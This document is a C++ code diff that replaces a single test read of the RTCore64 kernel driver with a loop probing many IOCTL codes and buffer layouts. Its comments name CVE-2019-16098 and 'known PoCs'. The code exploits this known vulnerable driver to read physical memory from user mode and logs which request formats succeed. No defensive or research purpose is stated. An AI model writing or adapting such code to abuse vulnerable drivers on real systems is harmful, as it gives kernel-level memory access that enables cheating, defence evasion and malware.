@@ -761,21 +761,106 @@ namespace sky::driver {
             LOG_INFO("Kernel driver connected");
 
             // Verify physical read IOCTL works
+            // Probe multiple IOCTL codes and formats
             {
-                RTCoreRequest test_req = {};
-                test_req.address = 0xF0000;  // BIOS ROM area — valid physical address
-                test_req.size = 4;
-                DWORD returned = 0;
-                BOOL ok = DeviceIoControl(g_hwinfo_device, RTC_IOCTL_READ,
-                    &test_req, sizeof(test_req),
-                    &test_req, sizeof(test_req),
-                    &returned, nullptr);
-                if (!ok) {
-                    LOG_WARNING("RTCore64 IOCTL test failed at startup (GLE=" +
-                        std::to_string(GetLastError()) + ")");
-                } else {
-                    LOG_INFO("RTCore64 IOCTL test OK — read 4 bytes from 0xF0000: 0x" +
-                        std::format("{:08x}", test_req.value));
+                struct RTCoreProbe {
+                    DWORD code;
+                    DWORD buf_size;
+                    const char* desc;
+                };
+
+                RTCoreProbe probes[] = {
+                    // Correct CVE-2019-16098 format (48-byte struct)
+                    { 0x80002048, 48, "0x80002048 48-byte struct" },
+                    { 0x8000204C, 48, "0x8000204C 48-byte struct" },
+                    // Alternative smaller sizes
+                    { 0x80002048, 24, "0x80002048 24-byte" },
+                    { 0x80002048, 28, "0x80002048 28-byte" },
+                    { 0x80002048, 32, "0x80002048 32-byte" },
+                    { 0x80002048, 64, "0x80002048 64-byte" },
+                    // Alternative IOCTL codes from known PoCs
+                    { 0x80002040, 48, "0x80002040 48-byte" },
+                    { 0x80002040, 16, "0x80002040 16-byte" },
+                    { 0x80002044, 48, "0x80002044 48-byte" },
+                    // METHOD_NEITHER variants (method=3)
+                    { 0x8000204B, 48, "0x8000204B (NEITHER) 48-byte" },
+                    { 0x8000204F, 48, "0x8000204F (NEITHER) 48-byte" },
+                };
+
+                for (const auto& p : probes) {
+                    uint8_t buf[128] = {};
+
+                    // For IOCTL codes tested with full 48-byte struct
+                    if (p.buf_size >= 48) {
+                        RTCoreRequest* req = (RTCoreRequest*)buf;
+                        req->address = 0xF0000;
+                        req->size = 4;
+                    } else if (p.buf_size >= 16) {
+                        // Legacy format: [8 pad][8 addr]
+                        *(uint64_t*)(buf + 8) = 0xF0000;
+                    }
+
+                    DWORD returned = 0;
+                    BOOL ok = DeviceIoControl(g_hwinfo_device, p.code,
+                        buf, p.buf_size,
+                        buf, p.buf_size,
+                        &returned, nullptr);
+
+                    if (ok) {
+                        uint32_t val = 0;
+                        if (p.buf_size >= 48) {
+                            val = ((RTCoreRequest*)buf)->value;
+                        } else if (returned > 16) {
+                            memcpy(&val, buf + 16, 4);
+                        }
+                        LOG_INFO("IOCTL probe OK: " + std::string(p.desc) +
+                            " val=0x" + std::format("{:08x}", val) +
+                            " ret=" + std::to_string(returned));
+                    } else {
+                        DWORD gle = GetLastError();
+                        if (gle != 87) {
+                            LOG_INFO("IOCTL probe " + std::string(p.desc) +
+                                " failed GLE=" + std::to_string(gle));
+                        }
+                        // GLE=87 is expected for most — don't spam on those
+                    }
+                }
+
+                // Also try simpler: just 8-byte addr input, 0x1000 output
+                {
+                    uint64_t addr = 0xF0000;
+                    uint8_t out[0x100] = {};
+                    DWORD returned = 0;
+                    BOOL ok = DeviceIoControl(g_hwinfo_device, 0x80002048,
+                        &addr, sizeof(addr),
+                        out, sizeof(out),
+                        &returned, nullptr);
+                    if (ok) {
+                        LOG_INFO("IOCTL probe OK: 0x80002048 8-byte-in/0x100-out");
+                    } else {
+                        DWORD gle = GetLastError();
+                        LOG_INFO("IOCTL probe: 0x80002048 8-byte-in GLE=" +
+                            std::to_string(gle));
+                    }
+                }
+
+                // Fallback: try with 48-byte struct but ALSO include addr in output
+                // by passing input_size larger than output_size (some drivers check
+                // outLen matches inLen explicitly)
+                {
+                    uint8_t buf[48] = {};
+                    ((RTCoreRequest*)buf)->address = 0xF0000;
+                    ((RTCoreRequest*)buf)->size = 4;
+                    DWORD returned = 0;
+                    BOOL ok = DeviceIoControl(g_hwinfo_device, 0x80002048,
+                        buf, 48,
+                        buf, 48,
+                        &returned, nullptr);
+                    if (ok) {
+                        uint32_t val = ((RTCoreRequest*)buf)->value;
+                        LOG_INFO("IOCTL probe OK: 0x80002048 48-equal-buf val=0x" +
+                            std::format("{:08x}", val));
+                    }
                 }
             }
 
